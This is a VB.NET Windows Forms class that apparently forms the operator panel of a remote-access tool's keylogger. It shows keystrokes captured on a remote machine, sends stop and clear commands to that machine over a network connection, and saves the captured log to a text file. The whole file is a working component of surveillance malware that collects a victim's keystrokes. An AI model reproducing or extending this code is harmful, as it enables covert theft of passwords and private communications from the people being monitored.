Public Class KeystrokeCapture

    Sub New(ByVal c As Connection)
        InitializeComponent() : Me.Tag = c
    End Sub

    Private Sub KeystrokeCapture_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        DirectCast(Me.Tag, Connection).Send("StopKeystrokeCapture|")
    End Sub

    Private Sub KeylogTextBox_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles KeylogTextBox.TextChanged
        KeylogTextBox.SelectionStart = KeylogTextBox.TextLength : KeylogTextBox.ScrollToCaret()
    End Sub

    Private Sub ClearToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearToolStripMenuItem.Click
        DirectCast(Me.Tag, Connection).Send("ClearKeystrokeCapture") : KeylogTextBox.Text = ""
    End Sub

    Private Sub SaveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            Dim sfd As New SaveFileDialog With {.Filter = "Text Files (*.txt)|*.txt"}
            If sfd.ShowDialog = DialogResult.OK Then
                IO.File.WriteAllText(sfd.FileName, KeylogTextBox.Text)
            End If
        Catch
        End Try
    End Sub
End Class